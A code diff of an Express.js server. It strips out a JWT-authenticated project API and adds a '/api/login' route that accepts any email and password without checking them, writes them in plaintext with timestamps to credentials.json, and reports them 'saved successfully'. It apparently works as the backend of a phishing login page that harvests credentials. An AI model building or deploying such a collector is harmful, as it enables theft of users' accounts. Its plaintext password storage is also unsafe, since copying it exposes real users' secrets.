@@ -1,76 +1,64 @@
 const express = require('express');
+const fs = require('fs').promises;
+const cors = require('cors');
 const path = require('path');
 
-const http = require('http');
-const { register, login } = require('./services/auth');
-const { createProject, getProject } = require('./services/projects');
-const { setupRealTime } = require('./services/realtime');
-const { uploadFile } = require('./services/files');
-const { autoLayout } = require('./services/ai');
-
 const app = express();
-const server = http.createServer(app);
-const io = setupRealTime(server);
+const port = 3000;
+
+const corsOptions = {
+  origin: 'http://127.0.0.1:5501',
+  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
+  preflightContinue: false,
+  optionsSuccessStatus: 204
+};
 
 app.use(express.json());
+app.use(cors(corsOptions));
+app.use(express.static(path.join(__dirname, '../client')));
 
-// Middleware to verify JWT
-function authenticate(req, res, next) {
-  const token = req.headers.authorization?.split(' ')[1];
-  if (!token) return res.status(401).json({ error: 'Unauthorized' });
+let credentials = [];
+
+async function loadCredentials() {
   try {
-    req.user = jwt.verify(token, 'secret_key');
-    next();
+    const data = await fs.readFile('credentials.json', 'utf8');
+    credentials = JSON.parse(data);
   } catch (err) {
-    res.status(401).json({ error: 'Invalid token' });
+    console.log('No existing credentials file found, starting fresh');
   }
 }
 
-// Auth Routes
-app.post('/api/auth/register', async (req, res) => {
-  const { email, username, password } = req.body;
-  const result = await register(email, username, password);
-  res.json(result);
-});
-app.post('/api/auth/login', async (req, res) => {
+async function saveCredentials() {
+  try {
+    await fs.writeFile('credentials.json', JSON.stringify(credentials, null, 2));
+  } catch (err) {
+    console.error('Error saving credentials:', err);
+    throw err;
+  }
+}
+
+app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
-  const result = await login(email, password);
-  res.json(result);
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email and password are required' });
+  }
+
+  const credential = { email, password, timestamp: new Date().toISOString() };
+  credentials.push(credential);
+
+  try {
+    await saveCredentials();
+    res.json({ message: 'Login credentials saved successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
-// Project Routes
-app.post('/api/projects', authenticate, async (req, res) => {
-  const { title, description } = req.body;
-  const project = await createProject(title, description, req.user.id);
-  res.json(project);
-});
-app.get('/api/projects/:id', authenticate, async (req, res) => {
-  const project = await getProject(req.params.id);
-  res.json(project);
-});
+async function startServer() {
+  await loadCredentials();
+  app.listen(port, () => {
+    console.log(`Server running at http://localhost:${port}`);
+  });
+}
 
-// File Upload (simplified, assumes multipart form-data in production)
-app.post('/api/files/upload', authenticate, async (req, res) => {
-  const { projectId, fileBuffer, fileName } = req.body; // Use multer for real files
-  const url = await uploadFile(projectId, fileBuffer, fileName);
-  res.json({ url });
-});
-
-// AI Route
-app.post('/api/ai/autolayout', authenticate, async (req, res) => {
-  const { designJson } = req.body;
-  const suggestions = await autoLayout(designJson);
-  res.json(suggestions);
-});
-
-app.get('/', (req, res) => {
-  res.send('Welcome to the API!');
-});
-
-app.use(express.static(path.join(__dirname, 'frontend')));
-
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'frontend', 'index.html'));
-});
-
-server.listen(3000, () => console.log('Server running on port 3000'));
+startServer().catch(console.error);
